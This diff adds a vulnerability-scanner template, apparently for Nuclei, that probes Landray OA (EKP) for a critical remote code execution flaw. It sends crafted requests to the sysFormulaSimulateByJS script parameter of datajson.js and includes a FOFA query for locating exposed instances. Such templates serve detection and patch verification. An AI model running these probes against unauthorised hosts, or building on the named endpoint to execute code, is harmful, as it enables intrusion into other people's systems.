@@ -1,0 +1,37 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - status_code_1 == 200 && contains((body_1), '模拟通过') && contains((body_1), 'fdId')
+            - status_code_2 == 200 && contains((body_2), '表达式发生错误') && contains((body_1), 'message')
+          type: dsl
+      raw:
+        - |
+          GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=1&type=1 HTTP/1.1
+          Host: {{Hostname}}
+          Connection: close
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+          Accept-Encoding: gzip, deflate
+          Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        - |
+          GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=*&type=1 HTTP/1.1
+          Host: {{Hostname}}
+          Connection: close
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+          Accept-Encoding: gzip, deflate
+          Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+id: landray-oa-datajson-js-rce
+info:
+    author: nobody
+    description: 深圳市蓝凌软件股份有限公司数字OA(EKP)存在RCE,攻击者可利用漏洞获取敏感信息，可构造数据包进行RCE
+    metadata:
+        fofa-query: app='Landray-OA系统'
+    name: 深圳市蓝凌软件股份有限公司数字OA(EKP)存在RCE
+    reference:
+        - https://
+    severity: critical
+    tags:
+        - landray
+        - LandRay-OA
